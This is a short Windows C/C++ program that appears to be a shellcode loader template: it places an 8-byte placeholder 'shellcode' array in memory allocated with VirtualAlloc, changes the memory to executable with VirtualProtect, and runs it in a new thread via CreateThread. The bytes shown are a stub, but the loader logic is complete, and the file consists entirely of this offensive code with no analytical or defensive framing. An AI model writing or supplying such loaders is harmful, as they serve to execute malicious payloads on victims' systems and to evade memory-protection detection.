#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


unsigned char shellcode[] = {
0xf9, 0x72, 0x49, 0x46, 0x25, 0x15, 0x0d, 0x7f
};
unsigned int shellcode_len = sizeof(shellcode);

int main(void) {
	void* payload_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	payload_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	 
	RtlMoveMemory(payload_mem, shellcode, shellcode_len);

	rv = VirtualProtect(payload_mem, shellcode_len, PAGE_EXECUTE_READ, &oldprotect);
	if (rv != 0) {

		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}